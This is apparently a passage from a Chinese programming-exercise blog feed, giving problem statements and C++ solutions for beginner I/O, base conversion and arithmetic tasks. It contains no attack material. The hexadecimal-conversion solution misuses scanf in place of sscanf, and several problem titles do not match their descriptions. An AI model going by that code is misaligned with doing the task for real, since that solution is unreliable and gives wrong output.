<h3 id="输出描述-1"><a href="#输出描述-1" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不同整型数据类型在内存中占多大（字节），具体格式详见输出样例，输出样例中的?为不同整型数据类型在内存中占的字节数。输出样例如下：</span><br><span class="line">The size of short is ? bytes.</span><br><span class="line">The size of int is ? bytes.</span><br><span class="line">The size of long is ? bytes.</span><br><span class="line">The size of long long is ? bytes.</span><br></pre></td></tr></table></figure>

<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The size of short is &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">short</span>) &lt;&lt; <span class="string">&quot; bytes.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The size of int is &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">int</span>) &lt;&lt; <span class="string">&quot; bytes.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The size of long is &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">long</span>) &lt;&lt; <span class="string">&quot; bytes.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The size of long long is &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>) &lt;&lt; <span class="string">&quot; bytes.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-C-缩短二进制"><a href="#题目名称-C-缩短二进制" class="headerlink" title="题目名称:C-缩短二进制"></a>题目名称:C-缩短二进制</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>  我们处理的整数通常用十进制表示，在计算机内存中是以二进制补码形式存储，但通常二进制表示的整数比较长，为了便于在程序设计过程中理解和处理数据，通常采用八进制和十六<a href="https://www.baidu.com/s?wd=16%E8%BF%9B%E5%88%B6&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao">进制</a>，缩短了<a href="https://www.baidu.com/s?wd=%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao">二进制补码表示的整数</a>，但保持了<a href="https://www.baidu.com/s?wd=%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao">二进制数</a>的表达特点。请输出十进制整数1234对应的八进制和十六进制。 </p>
<h3 id="输入描述-2"><a href="#输入描述-2" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-2"><a href="#输出描述-2" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十进制整数1234对应的八进制和十六进制（字母大写），用空格分开，并且要求，在八进制前显示前导0，在十六进制数前显示前导0X。</span><br></pre></td></tr></table></figure>

<h3 id="备注"><a href="#备注" class="headerlink" title="备注:"></a>备注:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf可以使用使用格式控制串“%o”、“%X”分别输出八进制整数和十六进制整数，并使用修饰符“#”控制前导显示</span><br></pre></td></tr></table></figure>

<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> decimalNumber = <span class="number">1234</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0%o 0X%X\n&quot;</span>, decimalNumber, decimalNumber);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-D-十六进制转十进制"><a href="#题目名称-D-十六进制转十进制" class="headerlink" title="题目名称:D-十六进制转十进制"></a>题目名称:D-十六进制转十进制</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>  BoBo写了一个十六进制整数ABCDEF，他问KiKi对应的十进制整数是多少。 </p>
<h3 id="输入描述-3"><a href="#输入描述-3" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-3"><a href="#输出描述-3" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制整数ABCDEF对应的十进制整数，所占域宽为15。</span><br></pre></td></tr></table></figure>

<h3 id="备注-1"><a href="#备注-1" class="headerlink" title="备注:"></a>备注:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf可以使用使用格式控制串“%md”输出域宽为m的十进制整数。</span><br></pre></td></tr></table></figure>

<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* hexNumber = <span class="string">&quot;ABCDEF&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> decimalNumber;</span><br><span class="line">    <span class="built_in">scanf</span>(hexNumber, <span class="string">&quot;%X&quot;</span>, &amp;decimalNumber);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%15d\n&quot;</span>, decimalNumber);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-E-牛牛学说话之-整数"><a href="#题目名称-E-牛牛学说话之-整数" class="headerlink" title="题目名称:E-牛牛学说话之-整数"></a>题目名称:E-牛牛学说话之-整数</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>  牛牛刚刚出生，嗷嗷待哺，一开始他只能学说简单的数字，你跟他说一个整数，他立刻就能学会。 </p>
<p>  输入一个整数，输出这个整数。 </p>
<h3 id="输入描述-4"><a href="#输入描述-4" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一个整数，范围在32位有符号整数范围内</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-4"><a href="#输出描述-4" class="headerlink" title="输出描述:"></a>输出描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出这个整数</span><br></pre></td></tr></table></figure>

<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> number;</span><br><span class="line">    cin &gt;&gt; number;</span><br><span class="line">    cout &lt;&lt; number &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-F-牛牛学说话之-浮点数"><a href="#题目名称-F-牛牛学说话之-浮点数" class="headerlink" title="题目名称:F-牛牛学说话之-浮点数"></a>题目名称:F-牛牛学说话之-浮点数</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p>  会说整数之后，牛牛开始尝试浮点数（小数） </p>
<p>  输入一个浮点数，输出这个浮点数。 </p>
<h3 id="输入描述-5"><a href="#输入描述-5" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入一个浮点数</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-5"><a href="#输出描述-5" class="headerlink" title="输出描述:"></a>输出描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出一个浮点数，保留三位小数</span><br></pre></td></tr></table></figure>

<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> number;</span><br><span class="line">    cin &gt;&gt; number;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.3lf\n&quot;</span>, number);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-G-打印小队旗"><a href="#题目名称-G-打印小队旗" class="headerlink" title="题目名称:G-打印小队旗"></a>题目名称:G-打印小队旗</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>只有一行，共三个整数，整数之间由一个空格分隔。 </p>
<h3 id="输入描述-6"><a href="#输入描述-6" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，共三个整数，整数之间由一个空格分隔。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-6"><a href="#输出描述-6" class="headerlink" title="输出描述:"></a>输出描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，一个整数，即输入的第二个整数。</span><br></pre></td></tr></table></figure>

<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">    cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-H-字符输入输出"><a href="#题目名称-H-字符输入输出" class="headerlink" title="题目名称:H-字符输入输出"></a>题目名称:H-字符输入输出</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>Kiki知道了字符类型变量可以使用char来定义，请帮他完成字符的输入输出。</p>
<h3 id="输入描述-7"><a href="#输入描述-7" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个字符。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-7"><a href="#输出描述-7" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出输入的字符。</span><br></pre></td></tr></table></figure>

<h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> character;</span><br><span class="line">    cin &gt;&gt; character;</span><br><span class="line">    cout &lt;&lt; character &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-I-小孩踢球"><a href="#题目名称-I-小孩踢球" class="headerlink" title="题目名称:I-小孩踢球"></a>题目名称:I-小孩踢球</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>题目描述： Kiki想用字符组成一个长方形，请编程帮他实现。 </p>
<h3 id="输入描述-8"><a href="#输入描述-8" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个字符。 </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-8"><a href="#输出描述-8" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用字符组成的正方形，形状如样例所示。                  </span><br></pre></td></tr></table></figure>

<h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure>

<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * *</span><br><span class="line">* * *</span><br><span class="line">* * *</span><br></pre></td></tr></table></figure>

<h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="comment">// 读取输入字符</span></span><br><span class="line">    cin &gt;&gt; ch;</span><br><span class="line">    <span class="comment">// 打印字符正方形</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            cout &lt;&lt; ch &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-J-小萨学名人名言"><a href="#题目名称-J-小萨学名人名言" class="headerlink" title="题目名称:J-小萨学名人名言"></a>题目名称:J-小萨学名人名言</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>Kiki想用字符组成一个长方形，请编程帮他实现。</p>
<h3 id="输入描述-9"><a href="#输入描述-9" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个字符。    </span><br></pre></td></tr></table></figure>

<h3 id="输出描述-9"><a href="#输出描述-9" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用字符组成的正方形，形状如样例所示。                </span><br></pre></td></tr></table></figure>

<h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure>

<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">***</span><br><span class="line">***</span><br><span class="line">***</span><br></pre></td></tr></table></figure>

<h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="comment">// 读取输入字符</span></span><br><span class="line">    cin &gt;&gt; ch;</span><br><span class="line">    <span class="comment">// 打印字符正方形</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            cout &lt;&lt; ch;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>程序设计基础习题</category>
      </categories>
      <tags>
        <tag>程序设计基础</tag>
      </tags>
  </entry>
  <entry>
    <title>程序设计基础(3)-顺序结构程序设计</title>
    <url>/2023/09/28/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80(3)-%E9%A1%BA%E5%BA%8F%E7%BB%93%E6%9E%84%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="程序设计基础-3-顺序结构程序设计"><a href="#程序设计基础-3-顺序结构程序设计" class="headerlink" title="程序设计基础(3)-顺序结构程序设计"></a>程序设计基础(3)-顺序结构程序设计</h1><h2 id="题目名称-1-123和345的各种运算"><a href="#题目名称-1-123和345的各种运算" class="headerlink" title="题目名称:1-123和345的各种运算"></a>题目名称:1-123和345的各种运算</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>计算机123和345加(+)、减(-)、乘(*)、除(&#x2F;)、求余(%)的各种结果。</p>
<h3 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无 。        </span><br></pre></td></tr></table></figure>

<h3 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">五行，一行一个结果，分别是加减乘除求余的结果。</span><br></pre></td></tr></table></figure>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">123</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">345</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加法</span></span><br><span class="line">    <span class="type">int</span> addition_result = a + b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, addition_result);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 减法</span></span><br><span class="line">    <span class="type">int</span> subtraction_result = a - b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, subtraction_result);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 乘法</span></span><br><span class="line">    <span class="type">int</span> multiplication_result = a * b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, multiplication_result);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 除法</span></span><br><span class="line">    <span class="type">int</span> division_result = a / b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, division_result);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 求余</span></span><br><span class="line">    <span class="type">int</span> remainder_result = a % b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, remainder_result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-2-计算表达式"><a href="#题目名称-2-计算表达式" class="headerlink" title="题目名称:2-计算表达式"></a>题目名称:2-计算表达式</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>​	rere学习了计算机编程中的加（+）、减（-）、乘（*）、除（&#x2F;），他想编程计算以下3个表达式，请编程帮他实现。</p>
<p>​	123456789+43214321</p>
<p>​	7078*8733</p>
<p>​	321*(123456+54321)</p>
<h3 id="输入描述-1"><a href="#输入描述-1" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-1"><a href="#输出描述-1" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三行，对应题目中3个算式的结果，一个行一个。</span><br></pre></td></tr></table></figure>

<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 计算第一个表达式</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result1 = <span class="number">123456789</span> + <span class="number">43214321</span>;</span><br><span class="line">    cout &lt;&lt; result1 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算第二个表达式</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result2 = <span class="number">7078</span> * <span class="number">8733</span>;</span><br><span class="line">    cout &lt;&lt; result2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算第三个表达式</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result3 = <span class="number">321</span> * (<span class="number">123456</span> + <span class="number">54321</span>);</span><br><span class="line">    cout &lt;&lt; result3 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-3-计算表达式的值"><a href="#题目名称-3-计算表达式的值" class="headerlink" title="题目名称:3-计算表达式的值"></a>题目名称:3-计算表达式的值</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">请计算表达式“(<span class="number">-8</span>+<span class="number">22</span>)×a<span class="number">-10</span>+c÷<span class="number">2</span>”，其中，a = <span class="number">40</span>，c = <span class="number">212</span>。</span><br></pre></td></tr></table></figure>

<h3 id="输入描述-2"><a href="#输入描述-2" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-2"><a href="#输出描述-2" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(-8+22)×a-10+c÷2计算之后的结果，为一个整数。</span><br></pre></td></tr></table></figure>

<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">40</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">212</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算表达式的值</span></span><br><span class="line">    <span class="type">int</span> result = (<span class="number">-8</span> + <span class="number">22</span>) * a - <span class="number">10</span> + c / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-4-A-B"><a href="#题目名称-4-A-B" class="headerlink" title="题目名称:4-A+B"></a>题目名称:4-A+B</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>请输所给A + B的值</p>
<h3 id="输入描述-3"><a href="#输入描述-3" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本题有多组案例，对于每一个案例输入一行两个数A， B。1 &lt; A, B &lt; 1000000</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-3"><a href="#输出描述-3" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每行输出一个结果                 </span><br></pre></td></tr></table></figure>

<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 1</span><br></pre></td></tr></table></figure>

<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> A, B;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取多组输入</span></span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; A &gt;&gt; B) &#123;</span><br><span class="line">        <span class="comment">// 计算A + B 的值</span></span><br><span class="line">        <span class="type">int</span> result = A + B;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-5-a-b-c-d的计算问题"><a href="#题目名称-5-a-b-c-d的计算问题" class="headerlink" title="题目名称:5-(a+b-c)*d的计算问题"></a>题目名称:5-(a+b-c)*d的计算问题</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>  这是一个非常简单的题目，意在考察你编程的基础能力。千万别想难了哦。输入为一行，包括了用空格分隔的四个整数a、b、c、d（0 &lt; a, b, c, d &lt; 100,000）。输出为一行，为“(a+b-c)*d”的计算结果。 </p>
<h3 id="输入描述-4"><a href="#输入描述-4" class="headerlink" title="输入描述:"></a>输入描述:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入为一行，用空格分隔的四个整数a、b、c、d（0 &lt; a, b, c, d &lt; 100,000）。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-4"><a href="#输出描述-4" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出为一行，为“(a+b-c)*d”的计算结果。                 </span><br></pre></td></tr></table></figure>

<h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 3 2 4</span><br></pre></td></tr></table></figure>

